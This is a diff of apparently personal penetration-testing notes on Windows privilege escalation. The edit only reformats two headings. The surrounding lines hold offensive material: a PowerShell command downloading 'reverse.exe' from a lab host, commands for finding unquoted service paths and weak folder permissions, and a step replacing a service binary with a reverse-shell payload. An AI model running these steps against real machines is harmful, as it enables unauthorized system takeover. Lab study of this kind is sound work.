@@ -80,7 +80,7 @@ format Invoke-WebRequest -Uri "http://192.168.56.49:8000/reverse.exe" -Outfile "
 
 ### Reveal vulnerable services on Windows System
 https://medium.com/@dasagreeva/windows-privilege-escalation-methods-2e93c954a287
-1. Unquoted Service Paths
+[] 1 Unquoted Service Paths
 #``` wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ ```
 
 Look for listed unquoted executable paths 
@@ -102,7 +102,7 @@ To restart and stop services USE
 #```sc stop ServiceName```
 #```sc start ServiceName```
 
-2. Insecure File/Folder Permissions
+[] 2 Insecure File/Folder Permissions
    Check permissions for vulnerable service executable path
 #```icacls “C:\Program Files (x86)\Program Folder\A Subfolder”```
 Replace executable.exe with a reverse shell payload and restarting the service
